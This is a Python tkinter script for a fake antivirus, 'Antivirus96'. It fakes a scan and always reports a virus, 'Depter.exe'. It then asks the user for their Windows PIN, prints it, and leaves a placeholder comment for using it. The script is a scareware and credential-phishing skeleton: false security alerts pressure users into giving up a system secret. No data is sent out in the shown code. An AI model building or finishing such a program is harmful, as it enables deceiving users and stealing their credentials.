import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import random

def simulate_loading():
    loading_bar["maximum"] = 150
    for i in range(101):
        loading_bar["value"] = i
        percentage_label.config(text=f"{i}%")  # Update the percentage label
        loading_bar.update()
        root.update_idletasks()
        root.after(20)  # Adjust the speed of the loading bar

    messagebox.showerror('Antivirus96', 'A virus (Depter.exe) has been detected')
    decision = messagebox.askokcancel('Antivirus96', 'Do you want to remove the virus?')
    if decision:
        print("User chose to remove the virus.")
        enter_pin()
        # Add code here to perform the removal action
    else:
        print("User chose not to remove the virus.")
        # Add code here for any other action or response
    quit()

def enter_pin():
    pin = simpledialog.askstring("Antivirus96", "Enter your Windows PIN:", show='*')
    if pin is not None:
        print(f"Entered PIN: {pin}")
        # Add code here to use the entered PIN
    else:
        print("User canceled PIN entry.")
    messagebox.showinfo('Antivirus96', 'Virus (Depter.exe) has been deleted')

def show_loading_hint(hint_text):
    messagebox.showinfo('Antivirus96', hint_text)

# Create the main window
root = tk.Tk()
root.title("Antivirus96")
root.geometry("400x270")  # Increased width to accommodate the big icon

messagebox.showinfo('Antivirus96', 'Welcome to Antivirus96 this version is in alpha, so if you see any glitch please contact support at antivirus96supp@gmail.com')

# Loading Bar
loading_bar = ttk.Progressbar(root, orient="horizontal", mode="determinate", length=200)
loading_bar.pack(pady=20)

# Percentage Label
percentage_label = tk.Label(root, text="click on Start Scanning", font=("Helvetica", 12))
percentage_label.pack(pady=5)

# Style for the "Start Scanning" button
button_style = ttk.Style()
button_style.configure("Scan.TButton", font=("Oswald", 12, "bold"), foreground="black", background="#4CAF50")

# Button to start the loading process
loading_button = ttk.Button(root, text="Start Scanning", command=simulate_loading, style="Scan.TButton")
loading_button.pack(pady=10)

# Label for random hints in the right-down corner with smaller text
hint_label = tk.Label(root, text="", anchor="se", justify="right", font=("Helvetica", 8), padx=10, pady=10)
hint_label.pack(side="bottom", fill="x", expand=True)

# Random hints about the program
random_hints = [
    "Best Program For Removing Virus",
    "Secure Your Computer Now",
    "Stay Protected from Malware",
    "Antivirus96 - Your Shield",
    "Safety First with Antivirus96"
]

# Function to update the random hint
def update_random_hint():
    random_hint = random.choice(random_hints)
    hint_label.config(text=random_hint)

# Update random hint initially
update_random_hint()

# Schedule the update of random hints every 10 seconds
root.after(10000, update_random_hint)

# Run the application
root.mainloop()
